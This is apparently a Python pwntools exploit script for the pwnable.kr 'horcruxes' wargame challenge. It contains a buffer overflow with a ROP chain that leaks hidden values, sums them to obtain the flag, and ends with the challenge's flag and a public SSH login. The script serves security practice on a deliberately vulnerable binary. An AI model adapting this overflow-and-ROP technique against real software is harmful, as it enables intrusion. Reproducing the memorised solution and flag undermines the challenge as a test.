#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

# ----------------- #
# Config / defaults #
# ----------------- #
context.log_level = "info"
REMOTE_USER = "horcruxes"
REMOTE_HOST = "pwnable.kr"
REMOTE_SSH_PORT = 2222
REMOTE_NC_CMD = "nc 0 9032"

exe = ELF('./horcruxes')

### defines ###
PADDING = 120

### helpers ###
def parse_exp(io: process):
    io.recvuntil("EXP +")
    line = io.recvuntil(")")[:-1]
    return int(line)

def start_local(exe_path: str = "./horcruxes", use_gdb: bool = False):
    if use_gdb:
        return gdb.debug([exe_path], gdbscript='tbreak main\ncontinue\n')
    return process([exe_path])

def start_ssh_nc(user: str, host: str, ssh_port: int, nc_cmd: str,
                 keyfile: str = None, password: str = None):
    log.info(f"ssh -> {user}@{host}:{ssh_port} ; running: {nc_cmd}")
    ssh_client = ssh(user, host, port=ssh_port, keyfile=keyfile, password=password)
    io = ssh_client.run(nc_cmd, tty=True)
    io.ssh_client = ssh_client
    return io

def main():
    exe_path = args.EXE or "./horcruxes"
    use_ssh = args.SSH
    keyfile = args.KEY or None
    password = args.PASSWORD or 'guest'
    use_gdb = args.GDB
    use_local_flag = args.LOCAL

    if use_ssh:
        io = start_ssh_nc(REMOTE_USER, REMOTE_HOST, REMOTE_SSH_PORT, REMOTE_NC_CMD,
                          keyfile=keyfile, password=password)
    else:
        io = start_local(exe_path, use_gdb=use_gdb)

# -- Exploit goes here --
    ### ROP Chain start ###
    # get all horcruxes values
    payload  = p32(exe.sym.A) 
    payload += p32(exe.sym.B)
    payload += p32(exe.sym.C)
    payload += p32(exe.sym.D)
    payload += p32(exe.sym.E)
    payload += p32(exe.sym.F)
    payload += p32(exe.sym.G)
    # back to the print flag function
    payload += p32(exe.sym.ropme)

    io.sendline('0') #menu option

    io.sendline(cyclic(PADDING) + payload)

    #calc sum
    sum = 0
    for _ in range(7):
        sum += parse_exp(io)

    io.sendline('0') #menu option
    io.sendline(str(sum))
    
    io.interactive()

if __name__ == "__main__":
    main()

#flag: The_M4gic_sp3l1_is_Avada_Ked4vra
